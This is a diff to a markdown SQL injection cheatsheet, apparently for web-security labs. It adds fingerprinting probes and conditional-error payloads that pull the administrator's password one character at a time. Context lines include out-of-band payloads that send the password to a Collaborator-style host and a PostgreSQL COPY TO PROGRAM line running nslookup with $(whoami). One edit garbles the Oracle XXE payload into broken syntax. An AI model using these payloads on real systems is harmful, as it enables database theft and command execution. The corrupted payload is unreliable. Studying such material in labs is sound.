@@ -56,7 +56,7 @@ Older versions of MSSQL used complex XML paths for row aggregation, but modern v
 
 ## 2. Row Aggregation & Multi-Column Concatenation Cheatsheet
 
-In your MySQL notes, you used `GROUP_CONCAT(id, 0x3a3a, user, 0x3a3a, password)` to pull multiple rows and columns in a single field. Here is how that translates across platforms when you need to concatenate multiple columns with delimiters.
+In your MySQL notes, you used `GROUP_CONCAT(id, 0x3a3a, user, 0x3a3a, password)` to pull multiple rows and columns in a single field. Here is how that translates across platforms when you need to concatenate data.
 
 | **Database**        | **Multi-Row Aggregation Function**                               | **Multi-Column Separator Syntax (using : as a delimiter)**               |
 |---------------------|------------------------------------------------------------------|--------------------------------------------|
@@ -69,7 +69,7 @@ In your MySQL notes, you used `GROUP_CONCAT(id, 0x3a3a, user, 0x3a3a, password)`
 
 ## 3. Order-By SQL Injection Notes
 
-When an injection point is located directly inside an `ORDER BY` clause (e.g., `SELECT * FROM products ORDER BY $_GET['sort']`), standard `UNION SELECT` statements often fail depending on the engine specifications.
+When an injection point is located directly inside an `ORDER BY` clause (e.g., `SELECT * FROM products ORDER BY $_GET['sort']`), standard `UNION SELECT` statements often fail depending on the engine specifics.
 
 ### Structural Verification Tests for `ORDER BY` Points
 
@@ -84,18 +84,18 @@ When an injection point is located directly inside an `ORDER BY` clause (e.g., `
 
 Instead of grabbing all tables at once (which truncates), these payloads use an offset/limit mechanism to leak exactly one table or schema name at a time securely.
 
-| **Database**   | **Extraction Payload (Single-Row Safe)**                                                                                                                  | **How to Iterate**                                      |
-|----------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------|
+| **Database**   | **Extraction Payload (Single-Row Safe)**                                                                                                                  | **How to Iterate**       |
+|----------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------
 | **MySQL**      | `' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -`                     | Change `LIMIT 0,1` to `LIMIT 1,1`, `LIMIT 2,1`, etc. |
-| **Oracle**     | `' AND 1=CAST((SELECT table_name FROM (SELECT table_name, rownum AS rn FROM all_tables WHERE owner=user) WHERE rn=1) AS INT)--`                           | Change `rn=1` to `rn=2`, `rn=3`, etc.                  |
-| **PostgreSQL** | `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0) AS INT)--`                          | Change `OFFSET 0` to `OFFSET 1`, `OFFSET 2`, etc.      |
-| **SQL Server** | `' AND 1=CAST((SELECT TOP 1 table_name FROM (SELECT TOP 1 table_name FROM information_schema.tables ORDER BY table_name ASC) AS Tech ORDER BY table_name DESC) AS INT)--` | Adjust `TOP` clause accordingly                        |
+| **Oracle**     | `' AND 1=CAST((SELECT table_name FROM (SELECT table_name, rownum AS rn FROM all_tables WHERE owner=user) WHERE rn=1) AS INT)--`                           | Change `rn=1` to `rn=2`, `rn=3`, etc. |
+| **PostgreSQL** | `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0) AS INT)--`                          | Change `OFFSET 0` to `OFFSET 1`, `OFFSET 2`, etc. |
+| **SQL Server** | `' AND 1=CAST((SELECT TOP 1 table_name FROM (SELECT TOP 1 table_name FROM information_schema.tables ORDER BY table_name ASC) AS Tech ORDER BY table_name DESC) AS INT)--` | Adjust `TOP` clause incrementally |
 
 ---
 
 ## 5. Upgraded Boolean-Based Blind Matrix (Single-Row Character Hunt)
 
-In the wild, you do not know if the table is named `users`. You must find the metadata table names character-by-character. These queries target row #1 (`OFFSET 0` or `LIMIT 0,1`) and check if its first character matches a given value.
+In the wild, you do not know if the table is named `users`. You must find the metadata table names character-by-character. These queries target row #1 (`OFFSET 0` or `LIMIT 0,1`) and check if its first character matches your guess.
 
 ### MySQL
 
@@ -163,7 +163,7 @@ When writing custom automated exploitation scripts (`session.post` structures), 
 
 ## 8. Conditional Error Probes (True vs. False)
 
-Use these when you cannot see any database output on the page, but the web application responds with a generic `200 OK` for a true condition and a `500 Internal Server Error` for a false condition. These are useful for automating blind SQL injection via HTTP status codes.
+Use these when you cannot see any database output on the page, but the web application responds with a generic `200 OK` for a true condition and a `500 Internal Server Error` for a false condition.
 
 ### Oracle
 
@@ -223,7 +223,7 @@ When an application displays database-generated error messages directly on scree
 
 ## 10. Conditional Time Delays with Data Retrieval
 
-When the page output remains completely static (no visible error shifts, no text changes), you must extract data character-by-character by measuring how long the server takes to respond. These examples measure the response time to confirm true or false conditions.
+When the page output remains completely static (no visible error shifts, no text changes), you must extract data character-by-character by measuring how long the server takes to respond.
 
 ### Oracle
 
@@ -261,7 +261,7 @@ When the page output remains completely static (no visible error shifts, no text
 
 ## 11. Out-of-Band (OAST) DNS Lookups & Data Exfiltration
 
-Out-of-band injection instructs the database server to initiate a network lookup (like a DNS request) to an external server you control (e.g., a Burp Collaborator domain). To make this dynamic "in the wild", you concatenate your extracted data into the URL itself.
+Out-of-band injection instructs the database server to initiate a network lookup (like a DNS request) to an external server you control (e.g., a Burp Collaborator domain). To make this dynamic and in-the-wild effective, embed your payload inside the DNS query itself.
 
 ### Oracle
 
@@ -404,6 +404,7 @@ sqlmap -u "https://TARGET/path" --cookie="TrackingId=BASE*" -D public -T users -
 -- PostgreSQL
 ' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
 if ordeby present then (CAST((SELECT password FROM users WHERE username='administrator') AS int))
+
 -- MySQL
 ' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users WHERE username='administrator')))--
 
@@ -418,7 +419,7 @@ if ordeby present then (CAST((SELECT password FROM users WHERE username='adminis
 
 ```sql
 -- Oracle
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLAB.oastify.com/">]%20%ext;');),'/l') FROM dual--
 
 -- PostgreSQL
 '; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).YOUR-COLLAB.oastify.com'--
@@ -464,6 +465,120 @@ if ordeby present then (CAST((SELECT password FROM users WHERE username='adminis
 
 ---
 
+## 15. Rapid 30-Second DBMS Fingerprinting
+
+To identify the database engine in under 30 seconds inside Burp Repeater, test these syntax probes in order:
+
+| **Order** | **Probe Payload**                         | **Behavior/Meaning**                                  |
+|-----------|-------------------------------------------|-------------------------------------------------------|
+| **1**     | `'` \|\| `(SELECT '' FROM dual)` \|\| `'` | Returns 200 OK → **Oracle** (dual table resolved)     |
+| **2**     | `'` \|\| `(SELECT '')` \|\| `'`          | Returns 200 OK → **PostgreSQL** (concatenation works without dual) |
+| **3**     | `' AND 1=1#`                              | Returns 200 OK → **MySQL** (# hash comment works)    |
+| **4**     | `'+(SELECT '')+'`                         | Returns 200 OK → **Microsoft SQL Server** (+ string concat) |
+
+---
+
+## 16. Conditional Error Injection Syntax by DBMS
+
+When you have confirmed the database engine, verify if your condition evaluates to HTTP 500 on TRUE and HTTP 200 on FALSE using the following payloads:
+
+### Oracle
+
+**True (Triggers 500 Error):**
+```sql
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+**False (Returns 200 OK):**
+```sql
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+**Password Extraction (Character-by-Character):**
+```sql
+'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+### PostgreSQL
+
+**True (Triggers 500 Error):**
+```sql
+'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END)||'
+```
+
+**False (Returns 200 OK):**
+```sql
+'||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS TEXT) ELSE '' END)||'
+```
+
+**Password Extraction (Character-by-Character):**
+```sql
+'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN CAST(1/0 AS TEXT) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+### Microsoft SQL Server (MSSQL)
+
+**True (Triggers 500 Error):**
+```sql
+'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INT) ELSE 0 END)+'
+```
+
+**False (Returns 200 OK):**
+```sql
+'+(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS INT) ELSE 0 END)+'
+```
+
+**Password Extraction (Character-by-Character):**
+```sql
+'+(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN CAST(1/0 AS INT) ELSE 0 END FROM users WHERE username='administrator')+'
+```
+
+### MySQL
+
+MySQL treats division by zero as `NULL` (warning only), so use numeric overflow `EXP(710)` to trigger a runtime crash:
+
+**True (Triggers 500 Error):**
+```sql
+' AND (SELECT IF(1=1, EXP(710), 0))#
+```
+
+**False (Returns 200 OK):**
+```sql
+' AND (SELECT IF(1=2, EXP(710), 0))#
+```
+
+**Password Extraction (Character-by-Character):**
+```sql
+' AND (SELECT IF(SUBSTRING(password,1,1)='a', EXP(710), 0) FROM users WHERE username='administrator')#
+```
+
+---
+
+## 17. HTTP Status Code Interpretation & Rule of Thumb
+
+Understanding how HTTP status codes relate to SQL injection conditions is critical for blind and conditional error injection:
+
+### Status Code Meanings
+
+| **HTTP Status** | **Meaning**                  | **Interpretation**                                                    |
+|-----------------|------------------------------|-----------------------------------------------------------------------|
+| **200 OK**      | Clean Query Execution        | Condition is **FALSE** — The safe branch was executed, no error thrown |
+| **500 Error**   | Fatal Database Crash         | Condition is **TRUE** — The database executed the forced error branch |
+
+### Rule of Thumb for Conditional Error Injection
+
+- **HTTP 500 (Fatal Crash):** The database executed the forced error branch (e.g., `1/0` or `TO_CHAR(1/0)`), proving your condition is **TRUE** or there is an uncaught syntax error.
+- **HTTP 200 (Clean Exit):** The database took the safe branch, bypassed the error expression, and executed the query normally, proving your condition is **FALSE**.
+
+### Example Workflow
+
+1. **Inject True Condition** → Observe HTTP **500** response
+2. **Inject False Condition** → Observe HTTP **200** response
+3. **Inject Target Query with Character Test** → If HTTP **500**, the character matches; if HTTP **200**, it does not match
+4. **Iterate through characters** → Automate the process to extract passwords, usernames, and other sensitive data one character at a time
+
+---
+
 ## Summary & Best Practices
 
 1. **Always identify the SQL engine first** — Different databases have different functions and syntax requirements.
@@ -473,7 +588,9 @@ if ordeby present then (CAST((SELECT password FROM users WHERE username='adminis
 5. **Automate character extraction** — Write scripts to brute-force character-by-character instead of manual testing.
 6. **Leverage SQLMap for efficiency** — Use the correct `--technique` flag for the vulnerability type.
 7. **Out-of-band exfiltration is fastest** — When available (DNS, HTTP), it bypasses output restrictions.
+8. **Use the 30-second fingerprinting guide** — Quickly identify the database engine before crafting payloads.
+9. **Master HTTP status code interpretation** — Know when 500 = TRUE and 200 = FALSE for conditional error injection.
 
 ---
 
-*Last Updated: 2026-08-24*
+*Last Updated: 2026-08-26*
